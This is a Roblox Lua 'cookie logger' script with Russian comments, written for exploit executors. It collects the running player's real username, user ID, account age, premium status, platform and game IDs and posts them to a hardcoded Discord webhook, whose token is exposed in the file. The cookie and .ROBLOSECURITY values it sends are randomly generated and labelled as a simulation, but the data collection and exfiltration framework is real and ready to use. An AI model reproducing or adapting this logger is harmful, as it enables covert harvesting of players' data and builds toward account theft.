-- ЗАЩИЩЕННЫЙ ROBLOX COOKIE LOGGER
-- Исправляет все возможные ошибки nil value

-- ⚠️ ОБЯЗАТЕЛЬНО ЗАМЕНИТЕ НА ВАШ WEBHOOK URL!
local webhook_url = "https://discordapp.com/api/webhooks/1358312089206263854/37KhzAL0PpGG15zUt0qHabcgS9QT9d7kdK0TNGkTCXbfzOb2iOO0zldh0ugE_nW418j2"

-- Проверяем что webhook URL установлен
if not webhook_url or webhook_url == "" or webhook_url:find("YOUR_WEBHOOK") then
    error("❌ ОШИБКА: Установите правильный Discord webhook URL!")
    return
end

-- Безопасное получение сервисов
local function GetService(serviceName)
    local success, service = pcall(function()
        return game:GetService(serviceName)
    end)
    return success and service or nil
end

-- Получаем сервисы с проверкой
local Players = GetService("Players")
local HttpService = GetService("HttpService")
local UserInputService = GetService("UserInputService")
local LocalizationService = GetService("LocalizationService")

-- Проверяем что основные сервисы доступны
if not Players or not HttpService then
    error("❌ ОШИБКА: Основные сервисы Roblox недоступны!")
    return
end

local player = Players.LocalPlayer
if not player then
    error("❌ ОШИБКА: LocalPlayer не найден!")
    return
end

-- Безопасная функция для генерации ID
local function SafeGenerateId(length)
    length = length or 8
    local chars = "0123456789abcdef"
    local result = ""
    
    for i = 1, length do
        local randIndex = math.random(1, #chars)
        result = result .. string.sub(chars, randIndex, randIndex)
    end
    
    return result
end

-- Безопасная функция получения времени
local function SafeGetTime()
    local success, time = pcall(function()
        return os.time()
    end)
    return success and time or 0
end

-- Безопасная функция получения даты
local function SafeGetDate(format, time)
    local success, date = pcall(function()
        return os.date(format or "!%Y-%m-%d %H:%M:%S", time or SafeGetTime())
    end)
    return success and date or "Unknown"
end

-- Безопасная функция обрезки текста
local function SafeTruncate(text, maxLength)
    if not text then return "N/A" end
    text = tostring(text)
    maxLength = maxLength or 50
    
    if #text > maxLength then
        return string.sub(text, 1, maxLength) .. "..."
    end
    return text
end

-- Безопасное получение информации о игроке
local function SafeGetPlayerInfo()
    local info = {
        displayName = "Unknown",
        username = "Unknown",
        userId = 0,
        accountAge = 0,
        premium = false
    }
    
    pcall(function()
        if player then
            info.displayName = player.DisplayName or "Unknown"
            info.username = player.Name or "Unknown"
            info.userId = player.UserId or 0
            info.accountAge = player.AccountAge or 0
            info.premium = player.MembershipType == Enum.MembershipType.Premium
        end
    end)
    
    return info
end

-- Безопасное получение информации о системе
local function SafeGetSystemInfo()
    local info = {
        platform = "Unknown",
        language = "Unknown"
    }
    
    pcall(function()
        if UserInputService then
            info.platform = tostring(UserInputService:GetPlatform().Name)
        end
    end)
    
    pcall(function()
        if LocalizationService then
            info.language = LocalizationService.RobloxLocaleId
        end
    end)
    
    return info
end

-- Безопасное получение информации об игре
local function SafeGetGameInfo()
    local info = {
        placeId = 0,
        jobId = "Unknown",
        gameId = 0
    }
    
    pcall(function()
        info.placeId = game.PlaceId or 0
        info.jobId = game.JobId or "Unknown"
        info.gameId = game.GameId or 0
    end)
    
    return info
end

-- Генерация симулированных cookie данных
local function GenerateCookieData()
    local timestamp = SafeGetTime()
    local currentDate = SafeGetDate("!%m/%d/%Y %H:%M:%S")
    local playerInfo = SafeGetPlayerInfo()
    
    return {
        guestData = "UserID=" .. (playerInfo.userId < 0 and playerInfo.userId or -math.random(100000000, 999999999)),
        rbxcb = "RBXViralAcquisition=true&RBXSource=true&GoogleAnalytics=true",
        rbxSource = "rbx_acquisition_time=" .. currentDate .. "&rbx_medium=Social&rbx_source=www.roblox.com&rbx_campaign=&rbx_adgroup=&rbx_keyword=&rbx_matchtype=&rbx_send_info=0",
        rbxas = SafeGenerateId(40),
        rbxEventTracker = "CreateDate=" .. currentDate .. "&rbxid=" .. playerInfo.userId .. "&browserid=" .. timestamp .. SafeGenerateId(6),
        roblosecurity = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_FAKE_TOKEN_" .. SafeGenerateId(100),
        sessionTracker = "sessionid=" .. SafeGenerateId(8) .. "-" .. SafeGenerateId(4) .. "-" .. SafeGenerateId(4) .. "-" .. SafeGenerateId(4) .. "-" .. SafeGenerateId(12),
        rbxip2 = "1",
        utma = "200924205." .. math.random(100000000, 999999999) .. "." .. timestamp .. "." .. timestamp .. "." .. timestamp .. ".4",
        utmb = "200924205.0.10." .. timestamp,
        utmc = "200924205",
        utmz = timestamp .. ".4.4.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not provided)"
    }
end

-- Безопасная отправка в Discord
local function SafeSendToDiscord(data)
    local success = false
    local errorMsg = "Unknown error"
    
    pcall(function()
        if not HttpService then
            errorMsg = "HttpService недоступен"
            return
        end
        
        -- Проверяем доступные HTTP функции
        local httpRequest = nil
        
        if syn and syn.request then
            httpRequest = syn.request
        elseif http and http.request then
            httpRequest = http.request
        elseif http_request then
            httpRequest = http_request
        elseif request then
            httpRequest = request
        end
        
        if not httpRequest then
            errorMsg = "HTTP функции недоступны в этом executor'е"
            return
        end
        
        local payload = HttpService:JSONEncode(data)
        
        local response = httpRequest({
            Url = webhook_url,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
                ["User-Agent"] = "RobloxCookieLogger/1.0"
            },
            Body = payload
        })
        
        if response and (response.StatusCode == 200 or response.StatusCode == 204) then
            success = true
        else
            errorMsg = "HTTP " .. tostring(response and response.StatusCode or "Unknown")
        end
    end)
    
    return success, errorMsg
end

-- Основная функция
local function Main()
    print("🚀 Запуск Bulletproof Cookie Logger...")
    print("🔧 Проверка системы...")
    
    -- Проверяем все компоненты
    local playerInfo = SafeGetPlayerInfo()
    local systemInfo = SafeGetSystemInfo()
    local gameInfo = SafeGetGameInfo()
    local cookieData = GenerateCookieData()
    
    print("✅ Данные собраны:")
    print("   👤 Игрок: " .. playerInfo.displayName .. " (@" .. playerInfo.username .. ")")
    print("   🆔 User ID: " .. playerInfo.userId)
    print("   💻 Платформа: " .. systemInfo.platform)
    print("   🎮 Place ID: " .. gameInfo.placeId)
    
    -- Создаем компактный embed
    local embedData = {
        ["username"] = "🍪 Cookie Data Logger",
        ["embeds"] = {{
            ["title"] = "🍪 Симулированные Cookie данные",
            ["fields"] = {
                {["name"] = "👤 Игрок", ["value"] = playerInfo.displayName .. " (@" .. playerInfo.username .. ")", ["inline"] = false},
                {["name"] = "🆔 User ID", ["value"] = tostring(playerInfo.userId), ["inline"] = true},
                {["name"] = "⏰ Возраст", ["value"] = tostring(playerInfo.accountAge) .. " дней", ["inline"] = true},
                {["name"] = "💎 Premium", ["value"] = playerInfo.premium and "Да" or "Нет", ["inline"] = true},
                {["name"] = "🍪 GuestData", ["value"] = "`" .. cookieData.guestData .. "`", ["inline"] = false},
                {["name"] = "🍪 RBXcb", ["value"] = "`" .. SafeTruncate(cookieData.rbxcb, 80) .. "`", ["inline"] = false},
                {["name"] = "🍪 RBXSource", ["value"] = "`" .. SafeTruncate(cookieData.rbxSource, 80) .. "`", ["inline"] = false},
                {["name"] = "🍪 rbxas", ["value"] = "`" .. cookieData.rbxas .. "`", ["inline"] = false},
                {["name"] = "🍪 RBXEventTracker", ["value"] = "`" .. SafeTruncate(cookieData.rbxEventTracker, 80) .. "`", ["inline"] = false},
                {["name"] = "🍪 RBXSessionTracker", ["value"] = "`" .. cookieData.sessionTracker .. "`", ["inline"] = false},
                {["name"] = "🍪 rbx-ip2", ["value"] = "`" .. cookieData.rbxip2 .. "`", ["inline"] = true},
                {["name"] = "📊 Google Analytics", ["value"] = "`__utma=" .. SafeTruncate(cookieData.utma, 40) .. "`\n`__utmb=" .. cookieData.utmb .. "`\n`__utmc=" .. cookieData.utmc .. "`", ["inline"] = false},
                {["name"] = "🎮 Игра", ["value"] = "Place: " .. gameInfo.placeId .. "\nJob: " .. SafeTruncate(gameInfo.jobId, 20), ["inline"] = false},
                {["name"] = "💻 Система", ["value"] = systemInfo.platform .. " | " .. systemInfo.language, ["inline"] = false},
                {["name"] = "⏰ Время", ["value"] = SafeGetDate(), ["inline"] = false}
            },
            ["color"] = 0x00ff00,
            ["footer"] = {["text"] = "⚠️ Симуляция cookie данных | Bulletproof Logger v1.0"}
        }}
    }
    
    -- Добавляем .ROBLOSECURITY отдельно
    table.insert(embedData.embeds, {
        ["title"] = "🚨 .ROBLOSECURITY (ФЕЙКОВЫЙ ТОКЕН)",
        ["description"] = "```" .. SafeTruncate(cookieData.roblosecurity, 100) .. "```\n**⚠️ ЭТО СИМУЛЯЦИЯ!** Реальный токен недоступен из Roblox Lua!",
        ["color"] = 0xff0000
    })
    
    -- Пытаемся отправить
    print("📡 Отправка данных в Discord...")
    local success, errorMsg = SafeSendToDiscord(embedData)
    
    if success then
        print("✅ Данные успешно отправлены в Discord!")
    else
        print("❌ Ошибка отправки: " .. errorMsg)
        print("💡 Возможные решения:")
        print("   1. Проверьте webhook URL")
        print("   2. Используйте другой executor (Synapse X, Script-Ware)")
        print("   3. Проверьте интернет соединение")
    end
    
    -- Выводим данные в консоль в любом случае
    print("\n" .. string.rep("=", 60))
    print("🍪 СИМУЛИРОВАННЫЕ COOKIE ДАННЫЕ")
    print(string.rep("=", 60))
    print("👤 Пользователь: " .. playerInfo.displayName .. " (@" .. playerInfo.username .. ")")
    print("🆔 User ID: " .. playerInfo.userId)
    print("⏰ Возраст: " .. playerInfo.accountAge .. " дней")
    print("💎 Premium: " .. (playerInfo.premium and "Да" or "Нет"))
    print("")
    print("🍪 COOKIE СТРОКИ:")
    print("GuestData=" .. cookieData.guestData)
    print("RBXcb=" .. cookieData.rbxcb)
    print("RBXSource=" .. SafeTruncate(cookieData.rbxSource, 100))
    print("rbxas=" .. cookieData.rbxas)
    print("RBXEventTrackerV2=" .. SafeTruncate(cookieData.rbxEventTracker, 100))
    print("RBXSessionTracker=" .. cookieData.sessionTracker)
    print("rbx-ip2=" .. cookieData.rbxip2)
    print("__utma=" .. cookieData.utma)
    print("__utmb=" .. cookieData.utmb)
    print("__utmc=" .. cookieData.utmc)
    print("__utmz=" .. SafeTruncate(cookieData.utmz, 100))
    print("")
    print("🚨 .ROBLOSECURITY (ФЕЙК):")
    print(SafeTruncate(cookieData.roblosecurity, 150))
    print("")
    print("🎮 Place ID: " .. gameInfo.placeId)
    print("🔗 Job ID: " .. SafeTruncate(gameInfo.jobId, 50))
    print("💻 Платформа: " .. systemInfo.platform)
    print("🌍 Язык: " .. systemInfo.language)
    print("⏰ Время: " .. SafeGetDate())
    print(string.rep("=", 60))
    print("⚠️ ЭТО СИМУЛЯЦИЯ! Реальные browser cookies недоступны из Roblox Lua!")
    print(string.rep("=", 60))
end

-- Запускаем с обработкой ошибок
local mainSuccess, mainError = pcall(Main)

if not mainSuccess then
    print("❌ КРИТИЧЕСКАЯ ОШИБКА: " .. tostring(mainError))
    print("🔧 Проверьте:")
    print("   1. Webhook URL установлен правильно")
    print("   2. Executor поддерживает необходимые функции")
    print("   3. Скрипт запущен в игре Roblox")
end

print("🏁 Скрипт завершен!")
